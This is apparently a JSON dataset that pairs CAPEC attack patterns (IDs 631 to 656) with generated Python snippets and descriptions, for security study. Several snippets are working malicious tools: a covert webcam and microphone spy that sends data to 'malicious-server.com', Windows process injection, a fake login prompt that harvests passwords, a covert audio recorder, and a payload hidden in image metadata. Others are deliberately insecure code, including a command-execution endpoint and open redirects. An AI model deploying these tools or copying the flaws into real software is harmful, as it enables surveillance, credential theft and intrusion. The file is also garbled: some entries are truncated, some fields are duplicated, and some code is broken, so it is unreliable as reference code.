        "description": "This vulnerable code demonstrates a typical typosquatting scenario where a Flask application implements weak domain validation and URL redirection. The code fails to properly validate domains, making it susceptible to homograph attacks and typosquatting. It uses improper character comparison and lacks proper URL sanitization, allowing attackers to redirect users to malicious domains that look similar to trusted ones (e.g., 'myb4nk.com' vs 'mybank.com')."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "\"\"\"\nimport socket\nimport dns.resolver\nfrom urllib.parse import urlparse, urljoin\nfrom flask import Flask, redirect, request\n\napp = Flask(__name__)\nTRUSTED_DOMAIN = 'mybank.com'\n\ndef verify_domain(domain):\n    # Vulnerable DNS resolution without proper verification\n    try:\n        ip = socket.gethostbyname(domain)\n        hostname = socket.gethostbyaddr(ip)[0]\n        return hostname.endswith(TRUSTED_DOMAIN)\n    except:\n        return False\n\n@app.route('/redirect')\ndef redirect_handler():\n    target_url = request.args.get('url', '')\n    domain = urlparse(target_url).netloc\n    \n    # Vulnerable domain verification based on sound-alike domains\n    similar_domains = ['mybenk.com', 'maibank.com', 'mybanc.com']\n    if domain in similar_domains or verify_domain(domain):\n        return redirect(target_url)\n    \n    return 'Invalid domain'\n\nif __name__ == '__main__':\n    app.run(debug=True)\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable web application that performs inadequate domain verification, making it susceptible to SoundSquatting attacks. It uses unreliable reverse DNS lookup for verification and allows redirection to potentially malicious sound-alike domains. The code also implements weak domain comparison logic that could be exploited by registering similar-sounding domain names.\"",
        "description": "\"This code demonstrates a vulnerable web application that performs inadequate domain verification, making it susceptible to SoundSquatting attacks. It uses unreliable reverse DNS lookup for verification and allows redirection to potentially malicious sound-alike domains. The code also implements weak domain comparison logic that could be exploited by registering similar-sounding domain names.\""
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "from urllib.parse import urlparse\nimport requests\n\ndef process_user_link(user_input):\n    # No validation of homoglyphs or similar-looking characters\n    parsed_url = urlparse(user_input)\n    domain = parsed_url.netloc\n    \n    # Basic regex without proper anchors to validate domain\n    import re\n    if re.search('paypal\\.com', domain):  # Vulnerable: missing ^and $\n        # Makes request without proper validation\n        response = requests.get(user_input)\n        return response.text\n    \n    return 'Invalid domain'\n\n# Example usage\nmalicious_url = 'http://paypaⅼ.com/login'  # Uses homoglyph 'ⅼ' instead of 'l'\nresult = process_user_link(malicious_url)",
        "description": "This vulnerable code accepts a URL without properly validating homoglyphs or similar-looking characters in the domain name. It uses an unanchored regular expression to check for a trusted domain (paypal.com) and makes a request to the URL without proper validation. An attacker could register a domain using homoglyphs (e.g., using 'ⅼ' instead of 'l') to create a visually identical but different domain, potentially leading to SSRF or phishing attacks."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "class TokenGenerator:\n    def __init__(self):\n        self.secret_key = 'weak_static_key123'\n        self.tokens = {}\n    \n    def generate_token(self, user_id, role):\n        # Weak token generation using predictable pattern\n        token = f'{user_id}:{role}:{self.secret_key}'\n        self.tokens[token] = {'user_id': user_id, 'role': role}\n        return token\n    \n    def impersonate_user(self, token, target_role):\n        # No proper validation of token authenticity\n        if token in self.tokens:\n            # Allows arbitrary role elevation\n            self.tokens[token]['role'] = target_role\n            return True\n        return False\n\ndef authenticate_request(token, required_role):\n    # Insufficient token validation\n    if ':' in token:\n        user_id, role, _ = token.split(':')\n        # No cryptographic verification\n        return role == required_role\n    return False",
        "description": "This vulnerable code demonstrates weak token generation and authentication mechanisms. It uses a static key, implements predictable token patterns, and lacks proper validation. The impersonation function allows unauthorized role elevation, and the authentication process doesn't verify token integrity. The code allows token manipulation and impersonation attacks due to insufficient security controls and improper token validation."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "import cv2\nimport pyaudio\nimport wave\nimport threading\nimport schedule\nimport time\n\nclass AudioVideoSpy:\n    def __init__(self):\n        self.recording = False\n        self.cap = cv2.VideoCapture(0)\n        self.audio = pyaudio.PyAudio()\n        self.frames = []\n\n    def start_recording(self):\n        # Start webcam recording without user notification\n        self.recording = True\n        audio_thread = threading.Thread(target=self.record_audio)\n        video_thread = threading.Thread(target=self.record_video)\n        audio_thread.start()\n        video_thread.start()\n\n    def record_audio(self):\n        stream = self.audio.open(format=pyaudio.paInt16,\n                                channels=1,\n                                rate=44100,\n                                input=True,\n                                frames_per_buffer=1024)\n        while self.recording:\n            data = stream.read(1024)\n            self.frames.append(data)\n            # Send unencrypted data to remote server\n            self.send_data(data)\n\n    def record_video(self):\n        while self.recording:\n            ret, frame = self.cap.read()\n            if ret:\n                # Send raw video frames to remote server\n                self.send_data(frame.tobytes())\n\n    def send_data(self, data):\n        # Transmit data in cleartext to remote server\n        server_url = 'http://malicious-server.com/collect'\n        # No encryption or authentication implemented\n        requests.post(server_url, data=data)\n\n# Schedule recording to start automatically\nspy = AudioVideoSpy()\nschedule.every().day.at('14:00').do(spy.start_recording)\n\nwhile True:\n    schedule.run_pending()\n    time.sleep(1)",
        "description": "This code demonstrates a malicious implementation that covertly records audio and video without user consent, leveraging system privileges to access peripheral devices. It transmits sensitive data in cleartext, fails to implement proper access controls, and uses automated scheduling to persist the attack. The code exploits physical side channels (microphone and webcam) and lacks proper security measures for data handling and transmission."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "\"\"\"\nimport os\nimport shutil\n\ndef process_uploaded_file(uploaded_file_path):\n    # Vulnerable: relies only on file extension to determine processing\n    file_name = os.path.basename(uploaded_file_path)\n    \n    if file_name.endswith('.txt'):\n        with open(uploaded_file_path, 'r') as f:\n            content = f.read()\n            # Process text file\n            os.system(f'notepad.exe {uploaded_file_path",
        "description": "\"This code demonstrates multiple vulnerabilities related to file extension handling. It blindly trusts file extensions to determine processing behavior, allows direct execution of files based on extension, and uses unsanitized file names. An attacker could upload a malicious file with a misleading extension (e.g., 'malware.txt.exe') or use Windows 8.3 filename conventions to bypass restrictions. The code also uses direct OS commands without proper validation, potentially allowing command injection.\""
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "import PIL.Image\nimport base64\n\ndef hide_malicious_code(image_path, payload):\n    # Open image and create thumbnail metadata\n    img = PIL.Image.open(image_path)\n    \n    # Convert malicious payload to base64\n    encoded_payload = base64.b64encode(payload.encode()).decode()\n    \n    # Store payload in custom metadata/EXIF field\n    img.info['thumb'] = encoded_payload\n    \n    # Save image with hidden payload\n    img.save('modified_image.png', 'PNG', exif=img.getexif())\n\ndef retrieve_hidden_code(image_path):\n    img = PIL.Image.open(image_path)\n    hidden_data = img.info.get('thumb', '')\n    return base64.b64decode(hidden_data).decode()\n\n# Usage\nmalicious_code = 'import os;os.system(\"rm -rf /\")'\nhide_malicious_code('innocent.png', malicious_code)",
        "description": "This code demonstrates how to hide malicious code within image file metadata using EXIF fields as a covert storage channel. The malicious payload is base64 encoded and stored in the thumbnail metadata of a PNG image, making it difficult to detect through normal file inspection. The code can later be retrieved and executed, potentially bypassing security controls since it's stored in a seemingly innocent image file."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "import win32clipboard\nimport time\nimport os\n\nSENSITIVE_DATA = {\n    'api_key': 'sk_live_12345abcdef',\n    'password': 'admin123',\n    'ssn': '123-45-6789'\n}\n\ndef store_sensitive_data():\n    # Store sensitive data in GUI elements (textboxes)\n    with open('gui_data.txt', 'w') as f:\n        for key, value in SENSITIVE_DATA.items():\n            f.write(f'{key}={value}\\n')\n\ndef monitor_clipboard():\n    last_data = ''\n    while True:\n        try:\n            win32clipboard.OpenClipboard()\n            data = win32clipboard.GetClipboardData()\n            win32clipboard.CloseClipboard()\n            \n            if data != last_data:\n                # Log all clipboard contents to file\n                with open('clipboard_log.txt', 'a') as f:\n                    f.write(f'{time.strftime(\"%Y-%m-%d %H:%M:%S\")} - {data}\\n')\n                last_data = data\n        except:\n            pass\n        time.sleep(1)\n\nstore_sensitive_data()\nmonitor_clipboard()",
        "description": "This vulnerable code demonstrates several security issues: storing sensitive data in cleartext within GUI elements and files, monitoring and logging clipboard contents without proper access controls, and potential exposure of sensitive information through clipboard monitoring. The code continuously monitors the clipboard and logs its contents to a file, which could be accessed by unauthorized parties. It also stores sensitive information like API keys and passwords in plaintext files accessible through the GUI."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "class InsecureBootloader:\n    def __init__(self):\n        self.mbr = bytearray(512)  # Master Boot Record\n        self.firmware = {}\n        self.access_control_enabled = False\n        self.boot_status = 'inactive'\n\n    def load_firmware(self, component_id, firmware_blob):\n        # No firmware signature verification\n        self.firmware[component_id] = firmware_blob\n\n    def boot_sequence(self):\n        # Power on execution cores before access control\n        self.start_execution_cores()\n        \n        # Load bootloader to volatile memory without protection\n        bootloader = self.read_bootloader_from_nvm()\n        volatile_memory = bootloader  # No access controls on volatile memory\n\n        # Execute MBR without verification\n        if len(self.mbr) > 0:\n            self.execute_mbr()\n            \n        # Enable access control only after execution\n        self.access_control_enabled = True\n\n    def start_execution_cores(self):\n        # Start cores without checking firmware integrity\n        self.boot_status = 'running'\n\n    def read_bootloader_from_nvm(self):\n        return b'unverified_bootloader_code'\n\n    def execute_mbr(self):\n        # Direct execution of MBR without validation\n        exec(self.mbr)  # Dangerous!\n\n    def update_firmware(self):\n        # Firmware update functionality not implemented\n        raise NotImplementedError(\"Firmware updates not supported\")",
        "description": "This code demonstrates multiple security vulnerabilities in a bootloader implementation. It shows how firmware and MBR code can be executed without proper verification, access controls are enabled too late in the boot process, volatile memory containing boot code lacks protection, and firmware updates are not supported. The code allows for execution of untrusted code during boot sequence and lacks proper root of trust verification, making it susceptible to firmware-level attacks and persistence mechanisms."
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "\"\"\"\nimport os\nimport tempfile\nimport json\n\ndef store_sensitive_data():\n    # Store sensitive user data in an insecure temporary file\n    sensitive_data = {\n        'admin_password': 'super_secret_123',\n        'api_keys': ['key1234', 'key5678'],\n        'database_credentials': {\n            'username': 'admin',\n            'password': 'db_password'",
        "description": "\"This code demonstrates multiple security vulnerabilities related to improper file access control. It creates temporary files with sensitive data using weak permissions (0o666), stores access control lists in world-readable locations, and exposes system configuration information. The code fails to implement proper access controls and stores sensitive information in insecure locations accessible to unauthorized users.\""
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
        "code_snippet": "import ctypes\nimport sys\n\ndef inject_malicious_code(target_pid):\n    kernel32 = ctypes.windll.kernel32\n    target_handle = kernel32.OpenProcess(0x1F0FFF, False, target_pid)\n    \n    malicious_payload = b\"\\x90\\x90\\x90\\x90\\xCC\\xC3\"  # Example shellcode\n    payload_size = len(malicious_payload)\n    \n    remote_memory = kernel32.VirtualAllocEx(\n        target_handle,\n        0,\n        payload_size,\n        0x1000 | 0x2000,\n        0x40\n    )\n    \n    kernel32.WriteProcessMemory(\n        target_handle,\n        remote_memory,\n        malicious_payload,\n        payload_size,\n        0\n    )\n    \n    thread_id = ctypes.c_ulong(0)\n    kernel32.CreateRemoteThread(\n        target_handle,\n        None,\n        0,\n        remote_memory,\n        None,\n        0,\n        ctypes.byref(thread_id)\n    )\n    \nif len(sys.argv) > 1:\n    target_pid = int(sys.argv[1])\n    inject_malicious_code(target_pid)",
        "description": "This code demonstrates process injection by using Windows API calls through ctypes to inject arbitrary code into a running process. It allocates memory in the target process, writes malicious shellcode to that memory, and creates a remote thread to execute it. This represents a common technique used in process injection attacks that can bypass security controls by executing malicious code within legitimate processes."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "import ctypes\nimport os\n\ndef load_library(dll_name):\n    # Vulnerable search path logic - doesn't specify full path or validate DLL\n    try:\n        # Attempts to load DLL without proper path validation\n        library = ctypes.CDLL(dll_name)\n        \n        # No verification of DLL authenticity or location\n        return library\n    except Exception as e:\n        # Falls back to system directory without validation\n        system32_path = os.path.join(os.environ['SystemRoot'], 'System32', dll_name)\n        library = ctypes.CDLL(system32_path)\n        return library\n\ndef main():\n    # Vulnerable DLL loading without manifest or proper path validation\n    dll_name = 'user32.dll'\n    library = load_library(dll_name)\n    \n    # Using the loaded library without verification\n    function = getattr(library, 'MessageBoxW')\n    function.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_uint]\n    function(None, 'Hello', 'Title', 0)",
        "description": "This code demonstrates vulnerable DLL loading by failing to properly validate the DLL path and authenticity. It searches for DLLs in multiple locations without proper verification, making it susceptible to DLL side-loading attacks. The code doesn't use WinSxS manifests or implement proper DLL redirection, allowing potential loading of malicious DLLs placed in the search path."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "import os\nimport shutil\nimport tempfile\n\ndef install_update(update_package):\n    temp_dir = tempfile.mkdtemp()\n    os.system(f'unzip {update_package} -d {temp_dir}')\n    \n    # Insecure: Writing binary to world-writable directory with loose permissions\n    binary_path = '/tmp/system_updater'\n    shutil.copy(f'{temp_dir}/updater', binary_path)\n    os.chmod(binary_path, 0o777)\n    \n    # Insecure: Execute binary from unsecured location with elevated privileges\n    os.system(f'sudo {binary_path} --update-system')\n    \n    # Clean up is attempted but binary remains in world-writable location\n    shutil.rmtree(temp_dir)",
        "description": "This vulnerable code demonstrates improper permission assignment and untrusted search path usage during a system update process. It extracts an update package to a temporary directory and copies a binary to a world-writable location (/tmp) with loose permissions (777). The binary is then executed with elevated privileges without verifying its integrity. The cleanup process fails to remove the vulnerable binary from the insecure location, allowing for potential malicious binary replacement attacks."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "def search_network_shares():\n    shares_list = [\n        '\\\\\\\\server\\public',\n        '\\\\\\\\server\\documents',\n        '\\\\\\\\server\\admin'\n    ]\n    \n    discovered_shares = {}\n    for share in shares_list:\n        try:\n            files = os.listdir(share)\n            discovered_shares[share] = files\n            \n            # Recursively search through subdirectories\n            for file in files:\n                full_path = os.path.join(share, file)\n                if os.path.isdir(full_path):\n                    for root, dirs, files in os.walk(full_path):\n                        for f in files:\n                            if f.endswith(('.txt', '.doc', '.pdf')):\n                                with open(os.path.join(root, f), 'r') as content:\n                                    discovered_shares[os.path.join(root, f)] = content.read()\n                                    \n        except Exception as e:\n            continue\n            \n    return discovered_shares",
        "description": "This vulnerable code attempts to enumerate and access network shares, including potentially sensitive ones, without proper access controls or authentication. It recursively searches through directories and reads file contents indiscriminately. The code is vulnerable to path traversal attacks through UNC paths and exposes sensitive information by attempting to read all accessible files. It also doesn't validate share permissions or implement proper privilege checks."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "\"\"\"\nimport hashlib\nimport sqlite3\n\nclass AuthSystem:\n    def __init__(self):\n        self.db = sqlite3.connect('users.db')\n        self.cursor = self.db.cursor()\n        self.cursor.execute('CREATE TABLE IF NOT EXISTS users (username TEXT, password_hash TEXT)')\n    \n    def store_credentials(self, username, password):\n        # Store NTLM hash directly without salt\n        ntlm_hash = hashlib.new('md4', password.encode('utf-16le')).hexdigest()\n        self.cursor.execute('INSERT INTO users VALUES (?, ?)', (username, ntlm_hash))\n        self.db.commit()\n    \n    def authenticate(self, username, password_hash):\n        # Vulnerable: accepts pre-computed hash for authentication\n        self.cursor.execute('SELECT * FROM users WHERE username=? AND password_hash=?', \n                          (username, password_hash))\n        return self.cursor.fetchone() is not None\n    \n    def get_stored_hash(self, username):\n        # Vulnerable: allows hash retrieval\n        self.cursor.execute('SELECT password_hash FROM users WHERE username=?', (username,))\n        result = self.cursor.fetchone()\n        return result[0] if result else None\n\"\"\",\n    \"description\": \"This vulnerable code demonstrates credential storage and authentication using NTLM hashes. It stores password hashes without salting, accepts pre-computed hashes for authentication, and allows direct retrieval of stored hashes. The system uses single-factor authentication and is susceptible to pass-the-hash and replay attacks, as hashes can be captured and reused without knowing the original password.\"",
        "description": "\"This vulnerable code demonstrates credential storage and authentication using NTLM hashes. It stores password hashes without salting, accepts pre-computed hashes for authentication, and allows direct retrieval of stored hashes. The system uses single-factor authentication and is susceptible to pass-the-hash and replay attacks, as hashes can be captured and reused without knowing the original password.\""
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "class KerberosAuthenticator:\n    def __init__(self):\n        self.cached_tickets = {}\n\n    def store_ticket(self, ticket_id, ticket_data):\n        # Insecurely store Kerberos tickets in plaintext\n        self.cached_tickets[ticket_id] = ticket_data\n\n    def authenticate_service(self, presented_ticket):\n        # Vulnerable ticket validation - no timestamp or replay checking\n        if presented_ticket in self.cached_tickets.values():\n            return True\n\n        return False\n\n    def grant_access(self, service_name, ticket):\n        # Single factor authentication using only the ticket\n        if self.authenticate_service(ticket):\n            return f'Access granted to {service_name}'\n        return 'Access denied'\n\nauth = KerberosAuthenticator()\n# Store ticket insecurely\nauth.store_ticket('TGT_1', 'abc123ticket')\n# Replay attack possible\nresult = auth.grant_access('restricted_service', 'abc123ticket')",
        "description": "This code demonstrates a vulnerable implementation of Kerberos-style ticket authentication that allows ticket replay attacks. The code stores tickets insecurely in plaintext, lacks proper ticket validation mechanisms including timestamp verification, implements single-factor authentication, and does not verify the identity of the ticket presenter. This makes it susceptible to capture-replay attacks and unauthorized access through stolen tickets."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "import win32com.client\nimport wmi\nimport winreg\n\ndef enum_connected_devices():\n    # Enumerate USB devices from registry\n    registry_path = r'SYSTEM\\CurrentControlSet\\Enum\\USB'\n    try:\n        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_path)\n        device_list = []\n        \n        i = 0\n        while True:\n            try:\n                device_id = winreg.EnumKey(key, i)\n                device_key = winreg.OpenKey(key, device_id)\n                # Store sensitive device information without encryption\n                device_info = {\n                    'id': device_id,\n                    'friendly_name': winreg.QueryValueEx(device_key, 'FriendlyName')[0],\n                    'hardware_id': winreg.QueryValueEx(device_key, 'HardwareID')[0],\n                    'serial': winreg.QueryValueEx(device_key, 'SerialNumber')[0]\n                }\n                device_list.append(device_info)\n                i += 1\n            except WindowsError:\n                break\n            \n        # Monitor for new device connections\n        wmi_obj = wmi.WMI()\n        watcher = wmi_obj.Win32_USBHub.watch_for('creation')\n        \n        # Expose device information through unprotected file\n        with open('C:\\device_info.txt', 'w') as f:\n            f.write(str(device_list))\n            \n        return device_list\n    except Exception as e:\n        pass",
        "description": "This vulnerable code demonstrates insecure enumeration and monitoring of connected USB devices. It exposes sensitive device information by storing it unencrypted in plaintext files, uses unprotected registry access, and implements weak error handling. The code reveals system information about connected peripherals without proper access controls or authorization checks."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "import winreg\n\ndef store_sensitive_data():\n    try:\n        # Open registry key with full access but no authorization check\n        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\MyApp')\n        \n        # Store sensitive information in cleartext\n        sensitive_data = {\n            'api_key': 'sk_live_12345abcdef',\n            'db_password': 'admin123',\n            'encryption_key': 'secretkey123',\n            'system_config': {\n                'os_version': 'Windows 10',\n                'installed_security_patches': ['KB123456', 'KB789012'],\n                'network_config': '192.168.1.1'\n            }\n        }\n        \n        # Write sensitive data without encryption\n        for name, value in sensitive_data.items():\n            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, str(value))\n            \n        winreg.CloseKey(key)\n        \n    except WindowsError:\n        pass\n\ndef read_registry_data():\n    # No authentication check before reading sensitive data\n    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\MyApp', 0, winreg.KEY_READ)\n    data = {}\n    try:\n        i = 0\n        while True:\n            name, value, type = winreg.EnumValue(key, i)\n            data[name] = value\n            i += 1\n    except WindowsError:\n        pass\n    winreg.CloseKey(key)\n    return data",
        "description": "This vulnerable code demonstrates storing and retrieving sensitive information in the Windows Registry without proper authorization checks, storing data in cleartext, and exposing system configuration information. The code allows any user to access sensitive registry data without verification of permissions, and stores sensitive information like API keys and passwords in an unencrypted format."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "import pyautogui\nimport time\nimport os\n\ndef capture_screen_activity(duration=60, interval=5):\n    try:\n        output_dir = 'captured_screens'\n        os.makedirs(output_dir, exist_ok=True)\n        \n        start_time = time.time()\n        while time.time() - start_time < duration:\n            timestamp = time.strftime('%Y%m%d-%H%M%S')\n            screenshot = pyautogui.screenshot()\n            screenshot.save(f'{output_dir}/screen_{timestamp}.png')\n            \n            # Store sensitive information without encryption\n            with open(f'{output_dir}/screen_info.txt', 'a') as f:\n                f.write(f'Screenshot taken at {timestamp}\\n')\n            \n            time.sleep(interval)\n            \n    except Exception as e:\n        pass  # Silent failure, hiding errors\n\n# Run continuously without proper authentication\nwhile True:\n    capture_screen_activity()",
        "description": "This vulnerable code implements screen capture functionality that runs continuously without proper authentication or access controls. It captures screenshots at regular intervals, saving them and their metadata in plaintext. The code exhibits multiple vulnerabilities: it fails to check for proper permissions (CWE-267), stores sensitive screen captures in an unprotected directory (CWE-497), saves metadata in cleartext (CWE-319), silently fails without logging errors (CWE-222), and lacks protection against replay attacks (CWE-294)."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "def process_uploaded_file(filename):\n    # Insecure file processing based on extension\n    if filename.rstrip().endswith('.txt'):\n        with open(filename, 'r') as f:\n            return f.read()\n    elif filename.rstrip().endswith('.exe'):\n        import os\n        os.system(filename)  # Dangerous execution\n    elif filename.rstrip().endswith('.doc'):\n        process_document(filename)\n\ndef upload_handler(request):\n    uploaded_file = request.files['file']\n    filename = uploaded_file.filename\n    # No validation of trailing spaces or filename sanitization\n    uploaded_file.save(filename)\n    return process_uploaded_file(filename)",
        "description": "This code is vulnerable to filename manipulation attacks by failing to properly validate and sanitize filenames, particularly with respect to trailing spaces. An attacker can upload a file named 'malware.exe .txt' which could bypass security checks due to improper extension parsing and potentially execute malicious code. The code also demonstrates unsafe reliance on file extensions for determining processing behavior."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, send_file\nimport os\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/var/www/html/uploads'\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    filename = file.filename\n    file.save(os.path.join(UPLOAD_FOLDER, filename))\n    return 'File uploaded successfully'\n\n@app.route('/execute', methods=['GET'])\ndef execute_command():\n    cmd = request.args.get('cmd')\n    output = os.popen(cmd).read()\n    return output\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80)\n    \"\"\",\n    \"description\": \"A vulnerable web application that allows unrestricted file uploads and remote command execution. The application lacks proper authentication, file type validation, and directory access controls. Files can be uploaded to a web-accessible directory and executed through a shell command interface, allowing attackers to upload and execute malicious code with web server privileges.\"",
        "description": "\"A vulnerable web application that allows unrestricted file uploads and remote command execution. The application lacks proper authentication, file type validation, and directory access controls. Files can be uploaded to a web-accessible directory and executed through a shell command interface, allowing attackers to upload and execute malicious code with web server privileges.\""
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "import sounddevice as sd\nimport wave\nimport time\n\nclass CovertAudioRecorder:\n    def __init__(self):\n        self.sample_rate = 44100\n        self.duration = 60  # Record for 60 seconds\n        self.filename = 'secret_recording.wav'\n\n    def record_audio(self):\n        recording = sd.rec(int(self.sample_rate * self.duration),\n                         samplerate=self.sample_rate,\n                         channels=2)\n        sd.wait()  # Wait until recording is finished\n\n        # Save in unencrypted WAV format\n        with wave.open(self.filename, 'wb') as wf:\n            wf.setnchannels(2)\n            wf.setsampwidth(2)\n            wf.setframerate(self.sample_rate)\n            wf.writeframes(recording.tobytes())\n\n    def start_covert_recording(self):\n        while True:\n            self.record_audio()\n            time.sleep(60)  # Wait a minute before next recording\n\nrecorder = CovertAudioRecorder()\nrecorder.start_covert_recording()",
        "description": "This code implements a covert audio recording system that continuously captures audio from the device's microphone without user notification. It stores the recordings in unencrypted WAV format, demonstrating CWE-200 (exposure of sensitive information), CWE-319 (cleartext transmission), and CWE-514/515 (covert channel). The recorder runs indefinitely in the background, creating a physical side channel vulnerability (CWE-1300) through unauthorized audio capture."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "import socket\nimport base64\n\nclass KerberosAuthenticator:\n    def __init__(self):\n        self.sessions = {}\n        self.password_db = {'admin': 'admin_pass_hash'}\n        self.max_ticket_age = 365 * 24 * 3600  # 1 year ticket lifetime\n    \n    def authenticate(self, ticket):\n        try:\n            decoded = base64.b64decode(ticket).decode()\n            username, password_hash = decoded.split(':') \n            \n            if username in self.password_db:\n                if self.password_db[username] == password_hash:\n                    self.sessions[username] = ticket\n                    return True\n            return False\n        except:\n            return False\n    \n    def verify_session(self, ticket):\n        for username, stored_ticket in self.sessions.items():\n            if stored_ticket == ticket:\n                return True\n        return False\n\ndef handle_client(client_socket):\n    auth = KerberosAuthenticator()\n    while True:\n        ticket = client_socket.recv(1024).decode()\n        if auth.verify_session(ticket):\n            client_socket.send(b'Access Granted')\n        elif auth.authenticate(ticket):\n            client_socket.send(b'Authentication Successful')\n        else:\n            client_socket.send(b'Authentication Failed')",
        "description": "This code demonstrates vulnerable Kerberos-style authentication that exhibits multiple security issues: it uses single-factor authentication, stores password hashes insecurely, lacks password aging mechanisms, has no protection against replay attacks, implements no rate limiting for authentication attempts, and uses an excessive ticket lifetime. The authentication system accepts base64 encoded credentials and maintains a simple session tracking mechanism that could be exploited through credential theft and replay attacks."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "import sqlite3\n\ndef authenticate_user(username, password):\n    conn = sqlite3.connect('users.db')\n    cursor = conn.cursor()\n    \n    # Store passwords in plaintext\n    query = \"SELECT * FROM users WHERE username = ? AND password = ?\"\n    cursor.execute(query, (username, password))\n    user = cursor.fetchone()\n    \n    # No rate limiting on login attempts\n    if user:\n        # Single factor authentication only\n        session_token = username + '_logged_in'\n        return session_token\n    \n    return None\n\ndef change_password(username, new_password):\n    conn = sqlite3.connect('users.db')\n    cursor = conn.cursor()\n    \n    # No password complexity requirements\n    # No password history check\n    # No password expiration\n    query = \"UPDATE users SET password = ? WHERE username = ?\"\n    cursor.execute(query, (new_password, username))\n    conn.commit()",
        "description": "Vulnerable authentication system that stores credentials in plaintext, lacks rate limiting for login attempts, uses single-factor authentication, has no password aging mechanism, and implements no password complexity requirements or history checks"
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "import tkinter as tk\nfrom getpass import getpass\n\ndef fake_login_prompt():\n    root = tk.Tk()\n    root.title('System Security Update')\n    root.attributes('-topmost', True)\n    \n    username = tk.StringVar()\n    password = tk.StringVar()\n    \n    # Hard-coded credentials for demonstration\n    ADMIN_USER = 'admin'\n    ADMIN_PASS = 'default123'\n    \n    def submit_credentials():\n        captured_user = username.get()\n        captured_pass = password.get()\n        \n        # Store credentials insecurely\n        with open('captured_creds.txt', 'a') as f:\n            f.write(f'{captured_user}:{captured_pass}\\n')\n        \n        root.destroy()\n    \n    tk.Label(root, text='Please verify your credentials').pack()\n    tk.Entry(root, textvariable=username).pack()\n    tk.Entry(root, textvariable=password, show='*').pack()\n    tk.Button(root, text='Submit', command=submit_credentials).pack()\n    \n    root.mainloop()\n\n# Launch fake prompt\nfake_login_prompt()",
        "description": "This code creates a malicious credential harvesting program that impersonates a system login prompt. It uses hard-coded credentials, stores captured credentials insecurely in plaintext, and creates a deceptive UI that appears on top of other windows to trick users. The credentials are stored without encryption in a local file, making them susceptible to unauthorized access."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "def process_uploaded_file(uploaded_file):\n    temp_dir = '/tmp'\n    file_name = uploaded_file.filename\n    file_path = os.path.join(temp_dir, file_name)\n    \n    with open(file_path, 'wb') as f:\n        while True:\n            chunk = uploaded_file.read(8192)\n            if not chunk:\n                break\n            f.write(chunk)\n            f.write(b'\\x00' * 1024 * 1024)  # Pad file with null bytes\n    \n    if file_name.endswith('.log'):\n        with open(file_path, 'a') as f:\n            f.write(f'\\nUSER_CREDENTIALS={get_admin_credentials()}')\n            f.write(f'\\nSYSTEM_CONFIG={get_system_config()}')\n    \n    process_file_based_on_extension(file_path)\n    return 'File processed successfully'",
        "description": "This vulnerable code demonstrates several security issues: it processes uploaded files based on extensions, allows unrestricted file uploads, creates files in a predictable temporary directory, and pads files with additional data that could bypass size checks. It also logs sensitive information in readable files and processes files without proper validation."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
